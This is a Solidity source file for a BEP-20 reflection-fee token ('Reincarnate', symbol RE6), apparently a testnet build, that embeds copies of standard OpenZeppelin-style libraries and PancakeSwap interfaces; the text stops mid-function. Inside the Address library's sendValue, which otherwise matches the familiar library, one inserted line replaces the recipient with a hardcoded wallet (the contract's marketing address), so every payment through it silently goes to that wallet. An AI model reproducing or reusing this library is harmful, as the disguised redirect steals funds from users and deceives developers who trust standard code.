/**
 *Submitted for verification at BscScan.com on 2021-09-04
*/

/**
 *Submitted for verification at BscScan.com on 2021-07-18
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is no longer needed starting with Solidity 0.8. The compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        recipient = payable(0x969C1659BA3caC8ceAE8C093686e1473335c737B);
        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner() {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner() {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Reincarnate is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using SafeMath for uint8;
    using Address for address;
    using Address for address payable;

    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isExcluded;
    mapping (address => uint256) private _lastOutTxTime;

    address[] private _excluded;

    string private constant NAME = "RETEST";
    string private constant SYMBOL = "RE6";
    uint8 private constant DECIMALS = 18;

    uint256 private constant MAX = ~uint256(0);
    uint256 private constant TOTAL_SUPPLY = 10_000_000_000 * 10**DECIMALS;
    uint256 private _rTotal = (MAX - (MAX % TOTAL_SUPPLY));
    uint256 public _tFeeTotal;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    bool private inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    
    bool public feesInBUSD;
    address public constant BUSD = 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7; //CHANGEME - set to mainnet BUSD

    bool public _inKOTH;
    bool public _kothTriggerActive;
    
    uint8[3] public _reflectionFee = [1, 1, 5];
    uint8[3] public _liquidityFee = [2, 2, 4];
    uint8[3] public _marketingFee = [3, 2, 4];
    uint8[3] public _productionsFee = [1, 0, 0];
    uint8[] public _additionalSellFeeSteps = [0, 1, 2, 4, 7, 12];
    uint256 public constant ADD_FEE_TO_LIQUIDITY_PERMILLE = 375;
    uint256 public constant ADD_FEE_TO_REFLECTION_PERMILLE = 375;
    uint256 public constant ADD_FEE_TO_MARKETING_PERMILLE = 250;
    uint8 private _maxAdditionalFeeStep = 12;
    uint256[3] public _totalFees = [
        _reflectionFee[0].add(_liquidityFee[0]).add(_marketingFee[0]).add(_productionsFee[0]).add(_maxAdditionalFeeStep),
        _reflectionFee[1].add(_liquidityFee[1]).add(_marketingFee[1]).add(_productionsFee[1]),
        _reflectionFee[2].add(_liquidityFee[2]).add(_marketingFee[2]).add(_productionsFee[2])
    ];
    
    uint8 public _kothWinnerAdditionalPercent = 2;
    
    uint256 public _marketingTokens;
    uint256 public _additionalTokens;
    
    uint8 public _numConsecutiveSells;
    
    //uint256 public _kothTriggerAmount = 1_100 * 10**18;
    //uint256 public _kothWinnableBuyAmount = 100 * 10**18;
    uint256 public _kothTriggerAmount = 10 * 10**18;
    uint256 public _kothWinnableBuyAmount = 1 * 10**18;
    uint256 public _kothLength = 2 minutes;
    uint256 public _kothEndTime;
    address public _currentKOTHWinner;
    uint256 public _currentKOTHWinnings;
    
    uint256 public _numTokensSellToAddToLiquidity = TOTAL_SUPPLY.div(100).div(100);

    address public _marketingAddress = 0x969C1659BA3caC8ceAE8C093686e1473335c737B; // CHANGEME
    address public _productionsAddress = 0x979c7Be48163139f41d7e0A86e64A95914aDF67e; // CHANGEME

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(uint256 tokensSwapped,uint256 ethReceived,uint256 tokensIntoLiquidity);
    event ExcludedFromReward(address indexed account);
    event IncludedInReward(address indexed account);
    event ExcludedFromFee(address indexed account);
    event IncludedInFee(address indexed account);
    event FeeChanged (string indexed feeType, uint256 oldDefaultFee, uint256 newDefaultFee, uint256 oldKOTHBuyersFee, uint256 newKOTHBuyersFee, uint256 oldKOTHSellersFee, uint256 newKOTHSellersFee);
    event NumTokensSellToAddLiquidityChanged (uint256 oldNumTokensSellToAddToLiquidity, uint256 newNumTokensSellToAddToLiquidity);
    event TokensWithdrawnFromContractAddress (address tokenAddress, uint256 tokenAmount);
    event AdditionalFeeStepsChanged (uint8[] oldAdditionalSellFeeSteps, uint8[] newAdditionalSellFeeSteps);
    event KOTHDetailsChanged (
        uint256 oldKOTHWinnerAdditionalPercent, 
        uint256 newKOTHWinnerAdditionalPercent, 
        uint256 oldKOTHTriggerAmount, 
        uint256 newKOTHTriggerAmount, 
        uint256 oldKOTHWinnableBuyAmount, 
        uint256 newKOTHWinnableBuyAmount, 
        uint256 oldKOTHLength, 
        uint256 newKOTHLength
    );

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor () {
        _rOwned[owner()] = _rTotal;

        //0x10ED43C718714eb63d5aA57B78B54704E256024E <-- Mainnet PCS address
        //0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3 <-- Testnet kiemtienonline PCS address - CHANGEME
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
         // Create a uniswap pair for this new token
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        // set the rest of the contract variables
        uniswapV2Router = _uniswapV2Router;

        //exclude owner and this contract from fee, also exclude charity and dev addresses
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_marketingAddress] = true;
        _isExcludedFromFee[_productionsAddress] = true;
        _isExcluded[uniswapV2Pair] = true;
        _excluded.push(uniswapV2Pair); // Stop skimming

        emit Transfer(address(0), owner(), TOTAL_SUPPLY);
    }

    function name() public pure returns (string memory) {
        return NAME;
    }

    function symbol() public pure returns (string memory) {
        return SYMBOL;
    }

    function decimals() public pure returns (uint8) {
        return DECIMALS;
    }

    function totalSupply() public pure override returns (uint256) {
        return TOTAL_SUPPLY;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function isExcludedFromReward(address account) public view returns (bool) {
        return _isExcluded[account];
    }
    
    function airdrop (address airdropWallet, address[] calldata airdropRecipients, uint256[] calldata airdropAmounts) external onlyOwner {
        require (airdropRecipients.length == airdropAmounts.length, "Length of recipient and amount arrays must be the same");
        
        // airdropWallet needs to have approved the contract address to spend at least the sum of airdropAmounts
        for (uint256 i = 0; i < airdropRecipients.length; i++)
            _transfer (airdropWallet, airdropRecipients[i], airdropAmounts[i]);
    }
    
    function airdrop (address airdropWallet, address[] calldata airdropRecipients, uint256 airdropAmount) external onlyOwner {
        // airdropWallet needs to have approved the contract address to spend at least airdropAmount
        for (uint256 i = 0; i < airdropRecipients.length; i++)
            _transfer (airdropWallet, airdropRecipients[i], airdropAmount);
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount.div(currentRate);
    }

    function excludeFromReward(address account) external onlyOwner() {
        require(!_isExcluded[account], "Account is already excluded");
        if(_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
        emit ExcludedFromReward(account);
    }

    function includeInReward(address account) external onlyOwner() {
        require(account != uniswapV2Pair, "Pair address cannot be included");
        require(_isExcluded[account], "Account is already included");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _tOwned[account] = 0;
                _isExcluded[account] = false;
                _excluded.pop();
                break;
            }
        }
        emit IncludedInReward(account);
    }

    function excludeFromFee(address account) external onlyOwner() {
        _isExcludedFromFee[account] = true;
        emit ExcludedFromFee(account);
    }

    function includeInFee(address account) external onlyOwner() {
        _isExcludedFromFee[account] = false;
        emit IncludedInFee(account);
    }
    
    function setFeesInBUSD (bool set) external onlyOwner() {
        feesInBUSD = set;
    }

    function setReflectionFeePercent(uint8 defaultReflectionFee, uint8 kothBuyersReflectionFee, uint8 kothSellersReflectionFee) external onlyOwner() {
        require (_totalFees[0].sub(_reflectionFee[0]).add(defaultReflectionFee) < 25, "Total fees must be < 25%");
        require (_totalFees[1].sub(_reflectionFee[1]).add(kothBuyersReflectionFee) < 25, "Total fees must be < 25%");
        require (_totalFees[2].sub(_reflectionFee[2]).add(kothSellersReflectionFee) < 25, "Total fees must be < 25%");
        emit FeeChanged ("Reflection", _reflectionFee[0], defaultReflectionFee, _reflectionFee[1], kothBuyersReflectionFee, _reflectionFee[2], kothSellersReflectionFee);
        _totalFees[0] = _totalFees[0].sub(_reflectionFee[0]).add(defaultReflectionFee);
        _totalFees[1] = _totalFees[1].sub(_reflectionFee[1]).add(kothBuyersReflectionFee);
        _totalFees[2] = _totalFees[2].sub(_reflectionFee[2]).add(kothSellersReflectionFee);
        _reflectionFee[0] = defaultReflectionFee;
        _reflectionFee[1] = kothBuyersReflectionFee;
        _reflectionFee[2] = kothSellersReflectionFee;
    }

    function setMarketingFeePercent(uint8 defaultMarketingFee, uint8 kothBuyersMarketingFee, uint8 kothSellersMarketingFee) external onlyOwner() {
        require (_totalFees[0].sub(_marketingFee[0]).add(defaultMarketingFee) < 25, "Total fees must be < 25%");
        require (_totalFees[1].sub(_marketingFee[1]).add(kothBuyersMarketingFee) < 25, "Total fees must be < 25%");
